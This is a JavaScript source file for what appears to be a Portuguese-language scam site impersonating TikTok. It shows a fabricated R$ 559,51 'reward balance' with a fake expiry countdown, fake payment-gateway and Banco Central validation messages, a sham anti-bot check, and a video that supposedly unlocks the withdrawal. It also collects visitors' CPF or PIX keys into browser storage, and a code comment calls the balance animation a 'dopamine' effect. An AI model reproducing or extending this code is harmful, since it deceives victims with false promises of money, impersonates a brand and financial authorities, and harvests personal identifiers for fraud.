/**
 * Page navigation and rendering
 */

// Pages content
const pages = {
  withdraw: `
    <div class="withdraw-page-ds">
      <div class="expira-saldo-ds">
        <div class="timer-wrapper-ds">
          <p id="countdown-text-ds">
            SEU SALDO EXPIRA EM
            <span id="timer-ds">00:15:00</span>
          </p>
        </div>
      </div>

      <div class="page-title-ds">Resgatar recompensas</div>

      <!-- Card Preto Oficial com Moeda Dourada P -->
      <div class="saldo-card-ds">
        <div class="saldo-card-content">
          <div class="saldo-card-info">
            <span class="saldo-label-ds">Seu saldo</span>
            <div class="saldo-amount-ds">R$ 559,51</div>
            <div class="saldo-points-ds">= 5.595.100 pontos (s)</div>
          </div>
          <div class="saldo-coin-wrap">
            <img src="images/p-saldo-maior.png" alt="Moeda TikTok" class="saldo-coin-img">
          </div>
        </div>
        <div class="saldo-card-footer">
          Última recompensa: R$ 85,20
        </div>
      </div>

      <!-- Seção Sacar Dinheiro -->
      <div class="withdraw-box-ds">
        <div class="withdraw-box-header">
          <span class="withdraw-box-title">Sacar dinheiro</span>
          <div class="withdraw-transfer-line">
            <img src="images/fi-rs-credit-card.png" alt="" class="card-icon-ds">
            <span>Transferência via /</span>
            <img src="images/pix-logo.svg" alt="PIX" class="pix-logo-ds">
          </div>
        </div>

        <!-- Botões de Valores em Pills -->
        <div class="pills-grid-ds">
          <button type="button" class="pill-btn-ds" data-val="1.5">R$1,5</button>
          <button type="button" class="pill-btn-ds" data-val="5">R$5</button>
          <button type="button" class="pill-btn-ds" data-val="10">R$10</button>
        </div>

        <button type="button" class="pill-btn-total-ds selected" data-val="559.51">
          R$ 559,51
        </button>

        <!-- Formulário de Chave PIX Embutido Limpo -->
        <div class="pix-fields-ds" style="margin-top: 15px;">
          <select class="pix-type" style="width: 100%; padding: 12px; border: 1.5px solid #e0e0e0; border-radius: 8px; font-size: 14px; margin-bottom: 8px; background: #fff;">
            <option value="cpf" selected>Chave PIX: CPF</option>
            <option value="phone">Chave PIX: Telefone / Celular</option>
            <option value="email">Chave PIX: E-mail</option>
            <option value="random">Chave PIX: Aleatória</option>
          </select>
          <input type="text" placeholder="Digite seu CPF para receber o PIX" class="pix-key" style="width: 100%; padding: 12px; border: 1.5px solid #e0e0e0; border-radius: 8px; font-size: 14px; box-sizing: border-box; background: #fff;">
          <div class="pix-feedback-msg" id="pix-key-feedback"></div>
        </div>

        <button type="button" id="btn-realizar-saque-withdraw" class="btn-sacar-dinheiro-ds" onclick="executarAcaoSaque(event)">
          Realizar Saque
        </button>

        <div class="withdraw-disclaimer-ds">
          Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.
        </div>
      </div>

      <!-- Card Moedas Live (Indisponível - Efeito Oficial TikTok) -->
      <div class="secondary-box-ds">
        <div class="secondary-box-content">
          <img src="images/flor.png" alt="" class="sec-icon-ds">
          <div>
            <div class="sec-title-ds">Obtenha Moedas para a LIVE</div>
            <div class="sec-desc-ds">Use Moedas para enviar presentes virtuais para seus hosts favoritos.</div>
          </div>
        </div>
        <button type="button" class="btn-indisponivel-ds" disabled>Indisponível</button>
      </div>

      <!-- Card Recarga Móvel (Indisponível - Efeito Oficial TikTok) -->
      <div class="secondary-box-ds">
        <div class="secondary-box-content">
          <div>
            <div class="sec-title-ds">Recarga móvel</div>
            <div class="sec-phone-ds">+55 <span>| 11 98765-4321</span></div>
          </div>
        </div>
        <button type="button" class="btn-indisponivel-ds" disabled>Indisponível</button>
      </div>
    </div>
  `,

  loading: `
    <div class="loading-page-ds" style="padding: 40px 20px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 480px; box-sizing: border-box;">
      <div style="margin-bottom: 24px;">
        <img src="images/logotiktok.png" alt="TikTok" style="height: 38px; object-fit: contain;">
      </div>
      <div id="loading-status-text" style="font-size: 17px; font-weight: 700; color: #121212; margin-bottom: 24px; min-height: 48px; line-height: 1.35; transition: opacity 0.3s ease;">
        Conectando ao Gateway de Pagamentos...
      </div>
      <div style="width: 100%; max-width: 320px; height: 7px; background: #eaeaea; border-radius: 99px; overflow: hidden; position: relative;">
        <div id="loading-status-bar" style="height: 100%; width: 10%; background: #fe2c55; border-radius: 99px; transition: width 0.7s ease;"></div>
      </div>
      <div style="margin-top: 20px; font-size: 12px; color: #888; font-weight: 500;">
        Ambiente de Liquidação Segura
      </div>
    </div>
  `,

  registration: `
    <div class="antibot-page-wrapper">
      <div id="antibotMainContent">
        <main class="antibot-main">
          <div style="display: none;"></div>
        </main>

        <footer class="antibot-footer">
          <div class="footer-links">
            <a href="#" onclick="window.abrirPoliticaAntibot('privacy'); return false;">Política de Privacidade</a>
            <span>•</span>
            <a href="#" onclick="window.abrirPoliticaAntibot('terms'); return false;">Termos de Uso</a>
          </div>
          <div>© 2025 Todos os direitos reservados.</div>
        </footer>
      </div>

      <!-- CONFIRMATION SCREEN -->
      <div id="confirmationScreen">
        <div class="antibot-confirmation-icon">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
            <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"></path>
          </svg>
        </div>

        <div class="antibot-confirmation-title">Confirmação de segurança</div>
        <p class="antibot-confirmation-subtitle">
          Confirmamos que você não é um robô.<br>
          Aguarde enquanto realizamos o direcionamento seguro para a liberação do seu saque.
        </p>

        <div class="antibot-loader">
          <span></span><span></span><span></span>
        </div>
      </div>

      <!-- POPUP OVERLAY -->
      <div class="antibot-overlay active" id="popupOverlay">
        <div class="antibot-popup">

          <!-- STEP 1: Welcome -->
          <div class="antibot-welcome-step" id="welcomeStep">
            <div class="antibot-popup-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
              </svg>
            </div>
            <h2>Bem-vindo</h2>
            <p>Vamos fazer uma verificação rápida para liberar o acesso ao seu resgate de <strong>R$ 559,51</strong>.</p>
            <div class="antibot-popup-actions">
              <button type="button" class="antibot-btn-confirm" onclick="window.iniciarCaptchaAntibot()">Iniciar acesso</button>
              <button type="button" class="antibot-btn-cancel" onclick="window.voltarAoSaque()">Cancelar</button>
            </div>
          </div>

          <!-- STEP 2: Captcha -->
          <div class="antibot-captcha-step" id="captchaStep">
            <div class="antibot-popup-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
              </svg>
            </div>
            <h2>Prova humana</h2>
            <div class="antibot-captcha-question" id="captchaQuestion">Carregando…</div>
            <div class="antibot-captcha-label">DIGITE SUA RESPOSTA</div>
            <input type="text" class="antibot-captcha-input" id="captchaInput" placeholder="Sua resposta..." maxlength="10" inputmode="numeric" autocomplete="off">
            <div class="antibot-error-msg" id="errorMsg">Resposta incorreta. Tente novamente.</div>
            <div class="antibot-popup-actions">
              <button type="button" class="antibot-btn-confirm" id="btnProsseguir" onclick="window.verificarCaptchaAntibot()">Prosseguir</button>
              <button type="button" class="antibot-btn-cancel" onclick="window.voltarAoWelcome()">Voltar</button>
            </div>
          </div>

        </div>
      </div>

      <!-- PRIVACY POLICY MODAL -->
      <div class="antibot-policy-overlay" id="privacyModal">
        <div class="antibot-policy-modal">
          <div class="antibot-policy-header">
            <h3>Política de Privacidade</h3>
            <button type="button" class="antibot-policy-close" onclick="window.fecharPoliticaAntibot('privacy')">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path>
              </svg>
            </button>
          </div>
          <div class="antibot-policy-body">
            <p>Esta plataforma respeita sua privacidade e está comprometida com a proteção dos seus dados pessoais, nos termos da Lei Geral de Proteção de Dados (LGPD – Lei nº 13.709/2018).</p>
            <h4>1. Dados coletados</h4>
            <p>Coletamos apenas os dados estritamente necessários para o funcionamento do serviço: dados de navegação e informações fornecidas voluntariamente durante a solicitação de resgate.</p>
            <h4>2. Finalidade</h4>
            <p>Os dados são utilizados exclusivamente para viabilizar a prestação do serviço, garantir a segurança das operações e cumprir obrigações legais do Banco Central.</p>
            <h4>3. Segurança</h4>
            <p>Adotamos medidas técnicas e administrativas com criptografia militar SSL para proteger seus dados contra acesso não autorizado.</p>
          </div>
        </div>
      </div>

      <!-- TERMS OF USE MODAL -->
      <div class="antibot-policy-overlay" id="termsModal">
        <div class="antibot-policy-modal">
          <div class="antibot-policy-header">
            <h3>Termos de Uso</h3>
            <button type="button" class="antibot-policy-close" onclick="window.fecharPoliticaAntibot('terms')">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
                <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"></path>
              </svg>
            </button>
          </div>
          <div class="antibot-policy-body">
            <p>Ao acessar e utilizar esta plataforma, você declara ter lido, compreendido e concordado com os presentes Termos de Uso.</p>
            <h4>1. Natureza do serviço</h4>
            <p>A plataforma oferece campanhas promocionais de incentivo e recompensas via PIX, sujeitas à disponibilidade técnica e validação de titularidade.</p>
            <h4>2. Uso adequado</h4>
            <p>O usuário compromete-se a utilizar a plataforma de forma lícita, abstendo-se de práticas fraudulentas ou automatizadas.</p>
          </div>
        </div>
      </div>
    </div>
  `,

  video: `
  <div class="video-page">
  <div class="video-header">
    ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
  </div>
  
  <div class="header-content" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
    <div class="logo-container">
      <svg xmlns="http://www.w3.org/2000/svg" width="102" height="30" viewBox="0 0 102 30" fill="none"><path d="M9.49351 21.3496L9.59191 21.6274C9.57631 21.5956 9.54031 21.4984 9.49351 21.3496ZM4.92397 19.3739C5.09676 17.8817 5.68356 17.0459 6.78934 16.1891C8.37152 15.0287 10.3479 15.6851 10.3479 15.6851V11.7905C10.8284 11.7782 11.309 11.8081 11.7843 11.8799V16.8905C11.7843 16.8905 9.80851 16.2341 8.22633 17.3945C7.12114 18.2513 6.53315 19.0877 6.36095 20.5798C6.35555 21.391 6.50135 22.4506 7.17274 23.3668C7.00674 23.278 6.83754 23.1768 6.66515 23.0632C5.18616 22.027 4.91677 20.473 4.92397 19.3739ZM19.9448 4.59063C18.8564 3.34625 18.4448 2.08986 18.296 1.20728H19.6652C19.6652 1.20728 19.3922 3.52145 21.3818 5.79722L21.4094 5.82782C20.8731 5.47589 20.3814 5.06049 19.9448 4.59063Z" fill="#EE1D52"></path><path d="M26.5405 8.11923V13.029C26.5405 13.029 24.7933 12.9582 23.5003 12.6144C21.6949 12.1344 20.5346 11.3988 20.5346 11.3988C20.5346 11.3988 19.733 10.8732 19.6682 10.8372V20.9801C19.6682 21.5441 19.52 22.954 19.0682 24.1306C18.4784 25.669 17.5682 26.6788 17.4008 26.8846C17.4008 26.8846 16.2938 28.2502 14.3408 29.1694C12.5805 29.9986 11.0349 29.9776 10.5729 29.9986C10.5729 29.9986 7.90112 30.109 5.49695 28.4782C4.97685 28.1194 4.49153 27.7126 4.04736 27.2632L4.05936 27.2716C6.46413 28.9024 9.1353 28.792 9.1353 28.792C9.5979 28.771 11.1435 28.792 12.9033 27.9628C14.855 27.0436 15.9632 25.678 15.9632 25.678C16.1288 25.4722 17.0432 24.4624 17.6306 22.9234C18.0812 21.7475 18.2306 20.3375 18.2306 19.7729V9.63061C18.2954 9.66721 19.097 10.1928 19.097 10.1928C19.097 10.1928 20.2574 10.9296 22.0627 11.4084C23.3563 11.7516 25.1029 11.823 25.1029 11.823V7.97583C25.7005 8.11563 26.2099 8.15403 26.5405 8.11923Z" fill="#EE1D52"></path><path d="M25.1035 7.97568V11.8222C25.1035 11.8222 23.3569 11.7508 22.0633 11.4076C20.2579 10.9276 19.0976 10.1921 19.0976 10.1921C19.0976 10.1921 18.296 9.66646 18.2312 9.62986V19.7703C18.2312 20.3349 18.083 21.7449 17.6312 22.9209C17.0414 24.4599 16.1312 25.4697 15.9638 25.6755C15.9638 25.6755 14.8568 27.041 12.9038 27.9602C11.1441 28.7894 9.59848 28.7684 9.13588 28.7894C9.13588 28.7894 6.46472 28.8998 4.05995 27.269L4.04795 27.2606C3.7942 27.004 3.55522 26.7332 3.33216 26.4495C2.56477 25.4727 2.09437 24.3189 1.97617 23.9895C1.97582 23.9881 1.97582 23.9867 1.97617 23.9853C1.78538 23.4123 1.38578 22.0383 1.44038 20.7069C1.53698 18.3574 2.32897 16.9162 2.53837 16.5544C3.09319 15.5696 3.81468 14.6885 4.67074 13.9504C5.42572 13.3129 6.28189 12.8059 7.20391 12.4504C7.77883 12.2115 8.37791 12.0355 8.99069 11.9254C9.4389 11.8453 9.89266 11.8002 10.3479 11.7904V15.6826C10.3479 15.6826 8.37149 15.0262 6.78931 16.1866C5.68353 17.0434 5.09673 17.8792 4.92394 19.3713C4.91674 20.4705 5.18613 22.0245 6.66392 23.0619C6.83591 23.1759 7.00511 23.2771 7.17151 23.3655C7.42987 23.7144 7.74386 24.0185 8.1009 24.2655C9.54448 25.2189 10.7541 25.2855 12.3008 24.6663C13.3334 24.2577 14.1068 23.3247 14.4734 22.2903C14.6996 21.6447 14.6966 20.9943 14.6966 20.3229V1.20776H18.2966C18.4454 2.09035 18.857 3.34674 19.9454 4.59112C20.382 5.06098 20.8737 5.47638 21.4099 5.82831C21.5683 5.99931 22.3783 6.84409 23.4181 7.36369C23.9545 7.63179 24.52 7.83715 25.1035 7.97568Z" fill="black"></path><path d="M0.543457 22.7937V22.7973L0.632256 23.0499C0.622656 23.0205 0.589056 22.9311 0.543457 22.7937Z" fill="#69C9D0"></path><path d="M7.20399 12.4504C6.28197 12.8059 5.4258 13.3129 4.67082 13.9504C3.8147 14.6903 3.09359 15.5732 2.53965 16.5598C2.33025 16.9198 1.53826 18.3628 1.44166 20.7123C1.38706 22.0437 1.78666 23.4177 1.97745 23.9907C1.9771 23.9921 1.9771 23.9935 1.97745 23.9949C2.09745 24.3213 2.56605 25.4751 3.33344 26.4549C3.5565 26.7386 3.79548 27.0094 4.04923 27.2661C3.23575 26.7035 2.51026 26.0233 1.89645 25.2477C1.13566 24.2799 0.666469 23.1375 0.544071 22.8003L0.541071 22.7931V22.7883C0.350273 22.2171 -0.0505217 20.8419 0.0052776 19.5088C0.101876 17.1592 0.893867 15.718 1.10326 15.3562C1.65705 14.3695 2.37818 13.4865 3.23444 12.7468C3.98926 12.1091 4.84547 11.6021 5.76761 11.2469C6.34253 11.0079 6.9416 10.8319 7.55438 10.7219C8.47772 10.5604 9.42083 10.5464 10.3485 10.6805V11.7905C9.89345 11.7988 9.43969 11.8425 8.99137 11.9213C8.37822 12.0326 7.77893 12.2101 7.20399 12.4504Z" fill="#69C9D0"></path><path d="M18.296 1.20778H14.6961V20.3241C14.6961 20.9955 14.6991 21.6441 14.4729 22.2915C14.1093 23.3247 13.3359 24.2577 12.3051 24.6717C10.7577 25.2933 9.54815 25.2243 8.10517 24.2709C7.74813 24.0239 7.43415 23.7198 7.17578 23.3709C8.40517 24.0267 9.50555 24.0153 10.8687 23.4681C11.8935 23.0511 12.6735 22.1181 13.0335 21.0843C13.2603 20.4387 13.2573 19.7884 13.2573 19.1176V0H18.2282C18.2282 0 18.1718 0.475794 18.296 1.20778ZM25.1036 6.91252V7.9757C24.5199 7.83721 23.9542 7.63186 23.4176 7.36371C22.3778 6.84412 21.5678 5.99933 21.4094 5.82833C21.5931 5.94903 21.7838 6.05862 21.9806 6.15652C23.2448 6.78772 24.4868 6.97671 25.1036 6.91252Z" fill="#69C9D0"></path><path d="M78.2959 16.8815C78.2958 17.1549 78.3362 17.4269 78.4159 17.6884C78.4204 17.707 78.426 17.7252 78.4327 17.743C78.6247 18.3618 79.0097 18.9029 79.5314 19.2871C80.0531 19.6714 80.684 19.8786 81.3319 19.8784V22.9504C79.8373 22.9504 78.7663 23.0026 77.1373 22.039C75.2774 20.9398 74.2322 18.9298 74.2322 16.8425C74.2322 14.6909 75.401 12.5339 77.3827 11.4953C78.8191 10.7417 79.9123 10.7363 81.3319 10.7363V13.8065C80.5267 13.8067 79.7546 14.1266 79.1853 14.6959C78.616 15.2652 78.2961 16.0373 78.2959 16.8425V16.8815Z" fill="#69C9D0"></path><path d="M84.3912 16.8815C84.3916 17.1549 84.3512 17.4269 84.2712 17.6884C84.267 17.707 84.2614 17.7253 84.2544 17.743C84.0625 18.3619 83.6776 18.9031 83.1559 19.2874C82.6342 19.6716 82.0032 19.8788 81.3552 19.8784V22.9504C82.8504 22.9504 83.9208 23.0026 85.5498 22.039C87.4098 20.9398 88.4555 18.9298 88.4555 16.8425C88.4555 14.6909 87.2862 12.5339 85.305 11.4953C83.8686 10.7417 82.7748 10.7363 81.3552 10.7363V13.8065C82.1605 13.8065 82.9327 14.1263 83.5022 14.6957C84.0716 15.265 84.3916 16.0372 84.3918 16.8425L84.3912 16.8815Z" fill="#EE1D52"></path><path d="M34.3369 7.95044H45.5814L44.5422 11.0446H41.6022V22.8849H37.9801V11.0446H34.3369V7.95044ZM64.1385 7.95044V11.0446H67.7817V22.8849H71.4015V11.0446H74.3414L75.383 7.95044H64.1385ZM48.0275 11.4766C48.3739 11.4766 48.7125 11.3739 49.0006 11.1814C49.2886 10.989 49.5131 10.7155 49.6456 10.3954C49.7782 10.0754 49.8128 9.72327 49.7453 9.38354C49.6777 9.04381 49.5109 8.73174 49.266 8.48681C49.021 8.24187 48.709 8.07507 48.3692 8.00749C48.0295 7.93991 47.6773 7.9746 47.3573 8.10716C47.0373 8.23971 46.7638 8.46419 46.5713 8.7522C46.3789 9.04022 46.2762 9.37883 46.2762 9.72522C46.2762 10.1897 46.4607 10.6352 46.7891 10.9636C47.1176 11.2921 47.5631 11.4766 48.0275 11.4766ZM46.2732 22.8849H49.8233V12.7144H46.2732V22.8849ZM62.593 11.389H58.4422L54.8645 14.9704V7.96184H51.3383L51.3263 22.8849H54.8879V18.9963L55.9972 17.9925L59.4532 22.8849H63.2602L58.2538 15.7299L62.593 11.389ZM96.6449 15.7299L100.986 11.389H96.8351L93.2574 14.9704V7.96184H89.7306L89.7192 22.8849H93.2808V18.9963L94.3926 17.9925L97.8491 22.8849H101.652L96.6449 15.7299ZM87.5191 16.8423C87.5191 20.2149 84.7483 22.9491 81.3301 22.9491C77.912 22.9491 75.1418 20.2149 75.1418 16.8423C75.1418 13.4698 77.9126 10.7356 81.3301 10.7356C84.7477 10.7356 87.5203 13.4704 87.5203 16.8423H87.5191ZM84.3661 16.8423C84.3661 16.2419 84.188 15.6549 83.8544 15.1556C83.5208 14.6564 83.0467 14.2673 82.492 14.0375C81.9372 13.8077 81.3268 13.7476 80.7379 13.8647C80.1489 13.9818 79.608 14.271 79.1834 14.6956C78.7588 15.1202 78.4697 15.6611 78.3525 16.25C78.2354 16.839 78.2955 17.4494 78.5253 18.0041C78.7551 18.5589 79.1442 19.033 79.6434 19.3666C80.1427 19.7002 80.7297 19.8783 81.3301 19.8783C81.729 19.8785 82.1239 19.8002 82.4924 19.6477C82.8609 19.4952 83.1958 19.2716 83.4778 18.9897C83.7599 18.7077 83.9836 18.373 84.1362 18.0045C84.2889 17.6361 84.3674 17.2411 84.3673 16.8423H84.3661Z" fill="black"></path></svg>
    </div>
    
    <div class="balance-display" style="border: 2px solid #ff2c55; border-radius: 8px; padding: 15px; text-align: center;">
      <div style="font-size: 14px; margin-bottom: 5px;">SALDO</div>
      <div class="balance-amount" style="font-size: 18px; font-weight: bold;">R$ 559.51</div>
    </div>
  </div>
  
  <div style="border-bottom: 4px solid black; margin-bottom: 20px;"></div>
  
  <h1 style="color: #ff2c55; font-weight: 800; font-style: bold; font-family: 'Roboto', sans-serif;">
    DESBLOQUEIO DE SALDO
  </h1>
  <p class="video-instruction">Veja como liberar seu saque assistindo ao vídeo.</p>
  
  <style>
  .video-container {
    border: 2px solid #ff2c55;
    border-radius: 8px;
    overflow: hidden;
    max-width: 100%;
    height: auto;
    margin: 0 auto;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
  }

  .video-container video {
    width: 100%;
    height: auto;
    display: block;
    background-color: #000; /* previne fundo branco durante o carregamento */
    transition: opacity 0.3s ease-in-out;
    border-radius: 8px;
  }
</style>

  <div class="video-container">
    <video id="vslVideoQuiz" controls preload="metadata" playsinline>
      <source src="vsl/vsl-tiktok.mp4" type="video/mp4">
      Seu navegador não suporta a reprodução de vídeo.
    </video>
  </div>

  <div id="unlockContainer" class="unlock-container" style="display: none; opacity: 0; transform: translateY(20px); transition: opacity 0.6s ease, transform 0.6s ease; margin-top: 20px;">
    <button class="unlock-btn" id="unlockBtn" style="margin-top: 0; width: 100%;">
      DESBLOQUEAR AGORA
    </button>
  </div>
</div>
  `
};

// Current page state
let currentPage = null;

// Initialize page navigation
function initializePages() {
  // Add click handler for withdraw button

}

// Show specific page
function showPage(pageName) {
  const container = document.querySelector('.app-container');

  // Save current content if it's the first navigation
  if (!currentPage) {
    currentPage = container.innerHTML;
  }

  // Update container with new page content
  container.innerHTML = pages[pageName];

  // Add page-specific event listeners
  if (pageName === 'withdraw') {
    setupWithdrawPage();
  } else if (pageName === 'loading') {
    setupLoadingPage();
  } else if (pageName === 'registration') {
    setupRegistrationPage();
  } else if (pageName === 'video') {
    setupVideoPage();
  }
}

// Setup da tela de validação em tempo real (Loading Oficial de 3 segundos do DS)
function setupLoadingPage() {
  const textEl = document.querySelector('#loading-status-text');
  const barEl = document.querySelector('#loading-status-bar');

  const steps = [
    { text: "Conectando ao Gateway ByteDance Payments...", progress: 35 },
    { text: "Validando titularidade da chave PIX no Banco Central...", progress: 75 },
    { text: "Chave PIX validada com sucesso! Redirecionando...", progress: 100 }
  ];

  let current = 0;
  if (textEl && barEl) {
    textEl.textContent = steps[0].text;
    barEl.style.width = steps[0].progress + '%';

    const interval = setInterval(() => {
      current++;
      if (current < steps.length) {
        textEl.style.opacity = '0';
        setTimeout(() => {
          textEl.textContent = steps[current].text;
          textEl.style.opacity = '1';
          barEl.style.width = steps[current].progress + '%';
        }, 120);
      } else {
        clearInterval(interval);
        setTimeout(() => {
          showPage('video');
        }, 400);
      }
    }, 700);
  } else {
    setTimeout(() => {
      showPage('video');
    }, 1000);
  }
}

// Executa o avanço do saque salvando dados e chamando o loading
window.executarAcaoSaque = function(e) {
  if (e) e.preventDefault();
  let pixType = document.querySelector('.pix-type')?.value || 'cpf';
  let pixKey = (document.querySelector('.pix-key')?.value || '').trim();
  const digits = pixKey.replace(/\D/g, '');

  // Detecção Inteligente e Blindada de CPF
  if (digits.length === 11) {
    const ddd = parseInt(digits.substring(0, 2), 10);
    // Se começar com 0 (impossível ser DDD no BR) ou se o tipo for cpf ou se não for DDD de celular válido (11 a 99 com nono dígito 9)
    if (digits.startsWith('0') || pixType === 'cpf' || ddd < 11 || digits.charAt(2) !== '9') {
      pixType = 'cpf';
      pixKey = digits.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    }
  }

  try {
    const dataToSave = {
      tipo: pixType,
      tipoChave: pixType.toUpperCase(),
      chave: pixKey,
      chavePix: pixKey,
      saldo: '559,51',
      nome: 'Titular da Conta'
    };
    localStorage.setItem('userPixData', JSON.stringify(dataToSave));
    sessionStorage.setItem('userPixData', JSON.stringify(dataToSave));
  } catch(err) {}
  showPage('loading');
};

// Setup event listeners for withdraw page
function setupWithdrawPage() {
  const backBtn = document.querySelector('.back-btn');
  if (backBtn) {
    backBtn.addEventListener('click', () => {
      const container = document.querySelector('.app-container');
      if (container && currentPage) {
        container.innerHTML = currentPage;
        initializePages();
      }
    });
  }

  // Amount selection (Pills do DS)
  document.querySelectorAll('.pill-btn-ds, .amount-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      document.querySelectorAll('.pill-btn-ds, .pill-btn-total-ds, .amount-btn').forEach(b => b.classList.remove('selected', 'btn-active'));
      btn.classList.add('selected', 'btn-active');
    });
  });

  const btnTotal = document.querySelector('.pill-btn-total-ds');
  if (btnTotal) {
    btnTotal.addEventListener('click', () => {
      document.querySelectorAll('.pill-btn-ds, .amount-btn').forEach(b => b.classList.remove('selected', 'btn-active'));
      btnTotal.classList.add('selected');
    });
  }

  // Timer regressivo da tela de saque (15:00)
  const timerDs = document.querySelector('#timer-ds');
  if (timerDs) {
    let t = 15 * 60;
    if (window.__withdrawTimer) clearInterval(window.__withdrawTimer);
    window.__withdrawTimer = setInterval(() => {
      if (t <= 0) {
        clearInterval(window.__withdrawTimer);
        timerDs.textContent = '00:00:00';
        return;
      }
      const m = String(Math.floor(t / 60)).padStart(2, '0');
      const s = String(t % 60).padStart(2, '0');
      timerDs.textContent = `00:${m}:${s}`;
      t--;
    }, 1000);
  }

  // Submit button
  const submitBtn = document.querySelector('#btn-realizar-saque-withdraw, .btn-sacar-dinheiro-ds, .withdraw-submit-btn');
  if (submitBtn) {
    submitBtn.onclick = window.executarAcaoSaque;
  }

  // Máscara e validação em tempo real (Importado do DS)
  const pixKeyInput = document.querySelector('.pix-key');
  const pixTypeSelect = document.querySelector('.pix-type');
  const pixFeedback = document.querySelector('#pix-key-feedback');

  if (pixKeyInput && pixTypeSelect) {
    function aplicarMascaraPix() {
      let type = pixTypeSelect.value || 'cpf';
      let val = pixKeyInput.value.trim();
      let digits = val.replace(/\D/g, '');

      // Se começar com 0, no Brasil NÃO existe DDD 0X! É CPF 100% garantido!
      if (digits.startsWith('0') && type === 'phone') {
        pixTypeSelect.value = 'cpf';
        type = 'cpf';
      }

      if (typeof window.formatPixKey === 'function') {
        const formatado = window.formatPixKey(pixKeyInput.value, type);
        if (pixKeyInput.value !== formatado) {
          pixKeyInput.value = formatado;
        }
      }

      // Validação visual
      if (pixFeedback) {
        const val = pixKeyInput.value.trim();
        if (!val) {
          pixFeedback.className = 'pix-feedback-msg';
          pixFeedback.textContent = '';
        } else if (type === 'cpf') {
          const num = val.replace(/\D/g, '');
          if (num.length === 11) {
            pixFeedback.className = 'pix-feedback-msg is-valid';
            pixFeedback.textContent = '✓ CPF válido para transferência';
          } else {
            pixFeedback.className = 'pix-feedback-msg is-invalid';
            pixFeedback.textContent = 'Preencha os 11 dígitos do seu CPF';
          }
        } else if (type === 'phone') {
          const num = val.replace(/\D/g, '');
          if (num.length >= 10) {
            pixFeedback.className = 'pix-feedback-msg is-valid';
            pixFeedback.textContent = '✓ Telefone válido para transferência';
          } else {
            pixFeedback.className = 'pix-feedback-msg is-invalid';
            pixFeedback.textContent = 'Informe DDD + número do celular';
          }
        } else if (type === 'email') {
          if (val.includes('@') && val.includes('.')) {
            pixFeedback.className = 'pix-feedback-msg is-valid';
            pixFeedback.textContent = '✓ E-mail válido para transferência';
          } else {
            pixFeedback.className = 'pix-feedback-msg is-invalid';
            pixFeedback.textContent = 'Digite um e-mail válido';
          }
        } else {
          pixFeedback.className = 'pix-feedback-msg is-valid';
          pixFeedback.textContent = '✓ Chave registrada';
        }
      }
    }

    pixKeyInput.addEventListener('input', aplicarMascaraPix);
    pixTypeSelect.addEventListener('change', () => {
      pixKeyInput.value = '';
      if (pixFeedback) {
        pixFeedback.className = 'pix-feedback-msg';
        pixFeedback.textContent = '';
      }
      pixKeyInput.focus();
    });
  }

  // === ANIMAÇÃO DOPAMINA DO SALDO E MOEDA (PULO DO SALDO - BRUNO CTO) ===
  const saldoEl = document.querySelector('.saldo-amount-ds');
  const pointsEl = document.querySelector('.saldo-points-ds');
  const coinEl = document.querySelector('.saldo-coin-img');

  if (saldoEl) {
    const targetAmount = 559.51;
    const duration = 1200; // 1.2s fluido e impactante
    const startAmount = 0;

    saldoEl.textContent = 'R$ 0,00';
    if (pointsEl) pointsEl.textContent = '= 0 pontos (s)';

    // Som de moedas inicial
    try {
      if (typeof playMoneyCoinSound === 'function') {
        playMoneyCoinSound();
      }
    } catch (_) {}

    function formatBRL(val) {
      return val.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    }

    function formatPoints(val) {
      return Math.round(val * 10000).toLocaleString('pt-BR');
    }

    const startTime = performance.now();

    function stepSaldo(now) {
      const elapsed = now - startTime;
      const progress = Math.min(elapsed / duration, 1);
      // easeOutCubic
      const ease = 1 - Math.pow(1 - progress, 3);
      const current = startAmount + (targetAmount - startAmount) * ease;

      saldoEl.textContent = 'R$ ' + formatBRL(current);
      if (pointsEl) {
        pointsEl.textContent = '= ' + formatPoints(current) + ' pontos (s)';
      }

      if (progress < 1) {
        requestAnimationFrame(stepSaldo);
      } else {
        saldoEl.textContent = 'R$ 559,51';
        if (pointsEl) pointsEl.textContent = '= 5.595.100 pontos (s)';

        // Dispara o pulo do saldo (bounce / salto elástico)
        saldoEl.classList.remove('saldo-pula');
        void saldoEl.offsetWidth; // reflow
        saldoEl.classList.add('saldo-pula');

        if (coinEl) {
          coinEl.classList.remove('coin-pula');
          void coinEl.offsetWidth;
          coinEl.classList.add('coin-pula');
        }

        // Toca novo efeito sonoro ao atingir o saldo total
        try {
          if (typeof playMoneyCoinSound === 'function') {
            playMoneyCoinSound();
          }
        } catch (_) {}

        // Feedback háptico
        try {
          if ('vibrate' in navigator) navigator.vibrate([40, 60, 40]);
        } catch (_) {}
      }
    }

    setTimeout(() => {
      requestAnimationFrame(stepSaldo);
    }, 100);
  }
}

